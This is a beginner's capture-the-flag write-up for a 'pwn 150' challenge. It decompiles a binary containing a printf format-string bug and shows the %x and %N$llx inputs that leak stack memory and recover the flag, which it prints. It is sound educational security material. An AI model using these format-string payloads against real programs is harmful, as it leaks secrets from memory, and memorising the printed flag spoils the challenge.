# Readme | pwn 150

`Read me to get the flag.`

# Investigation
I opened the attached binary file in Ghidra again, and decompiled to C.

```
void vuln(void)

{
  FILE *__stream;
  long in_FS_OFFSET;
  char flag [32];
  char my_name [40];
  long overflow_gaurd;

  overflow_gaurd = *(long *)(in_FS_OFFSET + 0x28);
  __stream = fopen("flag.txt","r");
  fgets(flag,0x1c,__stream);
  fclose(__stream);
  puts("hello, what\'s your name?");
  fgets(my_name,0x1e,stdin);
  printf("hello ");
  printf(my_name);
  if (overflow_gaurd != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    exit_with_1();
  }
  return;
}

```

I am not very familar with PWN challenges, but we have a `printf` and an `fgets` that draw the eye, along side that `__stream`. Normally simple buffer overflows occur when you read into a buffer that is too small, but here you can see I've named a variable `overflow_gaurd`, since if we corrupt that variable we get locked out.

I began to research any vulnerabilities with `printf` and came across an excellent resource: [CTF101](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)

# Format String vulnerability
A very Interesting issue, where unchecked user input can access local variables and even pop variables from the stack. Scary stuff.

Let's try out some things:

```
hello, what's your name?
%x.%x.%x.%x
hello f6385880.0.0.6
```

Interesting, but it also looks a little like garbage. Values are output in hex, which makes that `ö8X`.

Let's try some more:
```
%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
hello b8ae1190.0.0.6.6.0.dea422a0.66746364.5f30675f.6d30735f%

```
Seemingly more garbage: `ftcd_0g_m0s_`

Another option explained allows you to enumerate through the values, so let's try that out. The example starts at 7, so let's try that

```
hello, what's your name?
%7$llx
hello 5596bde722a0
-> which is "U½ç"
```

```
%8$llx
77306e7b66746364
-> which is "w0n{ftcd"
```

....wait a second. that looks like the start of a flag. You can actually see it aswell, I figured it was garbage, but the `{` looks promising.

Let's keep going:

```
%8$llx
77306e7b66746364
w0n{ftcd

%9$llx
646133725f30675f
da3r_0g_

%10$llx
30625f656d30735f
0b_em0s_

%11$llx
7d5600356b30
}5k0

{5k00b_em0s_da3r_0g_w0n}ftcd

```
`{5k00b_em0s_da3r_0g_w0n}ftcd`
Which reversed is the flag `dctf{n0w_g0_r3ad_s0me_b00k5}`
